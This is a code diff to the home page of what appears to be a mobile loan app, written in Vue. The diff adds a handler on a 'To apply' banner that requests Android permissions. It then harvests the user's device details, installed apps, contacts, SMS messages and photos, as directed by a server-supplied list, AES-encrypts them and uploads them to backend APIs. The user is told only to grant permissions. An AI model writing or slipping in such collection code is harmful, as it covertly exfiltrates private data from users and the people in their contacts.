@@ -8,7 +8,7 @@
         <div class="btn" @click="toApply">Apply now</div>
         <!-- banner -->
         <div class="banner">
-            <div class="toapply">To apply</div>
+            <div class="toapply" @click="toa">To apply</div>
         </div>
         <div class="three">
             <img src="../../assets/shouye-three.png" alt="">
@@ -25,14 +25,67 @@
 </template>
 
 <script>
-import { getPhoneInfo } from '../../utils/android.js'
+import { getPermission, getDeviceInfo, getAppList, getSmsList, getPhotoList, getContactList, getPhoneInfo } from "../../utils/android.js";
+import { setDeviceInfoAPI, getshebeiInfoAPI, getAppInfoAPI, gettxlAPI, getduanxinAPI, getPhotoInfoAPI } from "../../api";
+import { add, unt } from "../../utils/AESKey.js";
 import isNext from '../form/isNext.js'
 export default {
     methods: {
         //去贷款
-        toApply() {
+        async toApply() {
             // isNext()
-            this.$router.push('/ocr')
+            // this.$router.push('/huoti')
+            // const res = await getPhoneInfo()
+            if (!this.$store.state.isLogin) {
+                this.$router.push('/login')
+            } else {
+                this.$router.push('beforeys')
+            }
+        },
+        //测试获取权限
+        async toa() {
+            let res = await getPermission()
+            if (!res.result) {
+                this.$store.commit('hideLoading')
+                Dialog({
+                    message: 'Please re-acquire the permission, if it is rejected twice, please open the permission in the phone settings', confirmButtonText: 'Confirm'
+                });
+                return
+            }
+            this.getInfo()
+        },
+        //获取设备信息上报情况
+        async getInfo() {
+            const res = await setDeviceInfoAPI()
+            this.list = unt(res.data).list
+            console.log(this.list, 'this.list')
+            console.log(JSON.stringify(this.list), 'this.list')
+            if (this.list.indexOf("DEVICE") > -1) {
+                let res = await getDeviceInfo();
+                let info = JSON.parse(res.appInfo);
+                getshebeiInfoAPI(add({ model: info.device }))
+            }
+            if (this.list.indexOf('APP') > -1) {
+                let res = await getAppList();
+                let info = JSON.parse(res.appInfo);
+                getAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
+            }
+            if (this.list.indexOf("CONTACT") > -1) {
+                let res = await getContactList();
+                let info = JSON.parse(res.appInfo);
+                gettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
+            }
+            if (this.list.indexOf("SMS") > -1) {
+                let res = await getSmsList();
+                let info = JSON.parse(res.appInfo);
+                getduanxinAPI(add({ model: { list: info.smsList } }))
+            }
+            if (this.list.indexOf("PHOTO") > -1) {
+                let res = await getPhotoList();
+                let info = JSON.parse(res.appInfo);
+                getPhotoInfoAPI(add({ model: { list: info.photoList } }))
+            }
+            console.log(this.list, '设备信息上报情况')
         }
     },
     async created() {
